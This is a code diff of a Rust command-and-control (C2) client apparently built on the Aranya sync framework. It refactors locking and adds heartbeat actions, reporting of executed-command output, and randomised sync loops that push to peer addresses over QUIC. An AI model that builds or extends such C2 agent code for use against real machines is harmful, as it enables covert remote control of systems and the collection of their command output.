@@ -24,7 +24,7 @@ use chrono::prelude::*;
 use rand::seq::IndexedRandom;
 
 struct C2Sink {
-    pub client: Option<AM<C2Client<C2Sink>>>,
+    pub client: Option<Arc<C2Client<C2Sink>>>,
     pub syncer: Option<Arc<Client>>,
 }
 
@@ -51,25 +51,25 @@ impl Sink<VmEffect> for C2Sink {
                     tokio::spawn(async move {
                         let a: Text = stdout.try_into().expect("String to Text fail");
                         let syncaddrs = {
-                            let clientl = client.lock().await;
-                            let syncerl = clientl.c2syncerm.lock().await;
+                            let syncerl = client.c2syncerm.lock().await;
                             syncerl.connections.to_vec()
                         };
                         
                         {
-                            let clientl = client.lock().await;
-                            clientl.do_action(vm_action!(command_executed(effect.command, a))).await;
+                            client.do_action(vm_action!(command_executed(effect.command, a))).await;
                         }
 
                         let syncerm = {
-                            let clientl = client.lock().await;
-                            Arc::clone(&clientl.c2syncerm)
+                            Arc::clone(&client.c2syncerm)
                         };
 
                         for addr in syncaddrs {
-                            c2push(addr, Arc::clone(&syncer), Arc::clone(&syncerm));
-                        }
+                            c2push(addr, Arc::clone(&syncer), Arc::clone(&syncerm)).await;
 
+                            // Need to sleep otherwise connection will
+                            //   not be made for some reason
+                            sleep(Duration::from_millis(10)).await;
+                        }
                     });
                 }
             }
@@ -114,6 +114,10 @@ fn main() {
             }
         ).unwrap();
 
+        let graph = GraphId::decode(config::GRAPH).unwrap();
+        aranya.set_graph(graph);
+        print!("Working on Graph ID `{}`\n", graph);
+
         let mut syncbind = bind.clone();
         syncbind.set_port(4446);
         let quic = Arc::new(new_quic_client(syncbind));
@@ -126,56 +130,30 @@ fn main() {
             )
         );
 
-        // Aranya Mutex I guess, maybe should be called Aranya Arc
-        let aranyam = Arc::new(Mutex::new(aranya));
+        let aranyaa = Arc::new(aranya);
+        let aranya = Arc::clone(&aranyaa);
         
-        // Setup the sink and print graph information
         {
-            let aranyac = Arc::clone(&aranyam);
-            let aranyal = &mut *aranyac.lock().await;
-
-            Arc::clone(&aranyal.sink).lock().await.client
-                = Some(Arc::clone(&aranyam));
-
-            Arc::clone(&aranyal.sink).lock().await.syncer
-                = Some(Arc::clone(&quic));
-
-            let graph = GraphId::decode(config::GRAPH).unwrap();
-            aranyal.set_graph(graph);
-
-            print!("Working on Graph ID `{}`\n", graph);
+            let mut sink = aranya.sink.lock().await;
+            sink.client = Some(Arc::clone(&aranyaa));
+            sink.syncer = Some(Arc::clone(&quic));
         }
 
-        // Let the syncer start up (warm up the engines :) )
-        // sleep(Duration::from_millis(1000)).await;
-
-
-
-        // TODO: Temp default sync ip for operator
-        // {
-        //     let aranyac = Arc::clone(&aranyam);
-        //     let aranyal = &mut *aranyac.lock().await;
-        //     let mut syncerl = aranyal.c2syncerm.lock().await;
-
-        //     syncerl.connections.push(SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 2)), 4445));
-        // }
 
         // Syncing logic loop
         loop {
-            print!("{:?} | Loop start\n", bind);
+            // print!("{:?} | Loop start\n", bind);
             // Stall for a random amount of time
             sleep(Duration::from_millis(rand::random_range(1000..2000))).await;
 
             // Sync up with some nodes
-            let aranyac = Arc::clone(&aranyam);
-            let aranyal = &mut *aranyac.lock().await;
 
             let syncaddrs = {
-                let syncerl = aranyal.c2syncerm.lock().await;
+                let syncerl = aranya.c2syncerm.lock().await;
                 syncerl.connections.to_vec()
             };
 
-            println!("{:?}", syncaddrs);
+            println!("{bind} {:?}", syncaddrs);
 
             // let mut max = 5;
             
@@ -187,27 +165,32 @@ fn main() {
             //         c2push(
                 //             syncaddr,
             //             &quic,
-            //             Arc::clone(&aranyal.c2syncerm)
+            //             Arc::clone(&aranya.c2syncerm)
             //         ).await;
             //     // }
             // // }
             // }
             
+            aranya.do_action(vm_action!(heartbeat())).await;
 
             let syncaddrs = {
-                let syncer = aranyal.c2syncerm.lock().await;
+                let syncer = aranya.c2syncerm.lock().await;
                 syncer.connections.to_vec()
             };
 
-            // for addr in syncaddrs {
-            //     c2push(
-            //         addr,
-            //         Arc::clone(&quic),
-            //         Arc::clone(&aranyal.c2syncerm)
-            //     ).await;
-            // }
+            for addr in syncaddrs {
+                c2push(
+                    addr,
+                    Arc::clone(&quic),
+                    Arc::clone(&aranya.c2syncerm)
+                ).await;
 
-            print!("{:?} | Loop end\n", bind);
+                // Need to sleep otherwise connection will
+                //   not be made for some reason
+                sleep(Duration::from_millis(10)).await;
+            }
+
+            // print!("{:?} | Loop end\n", bind);
         }
     });
 }
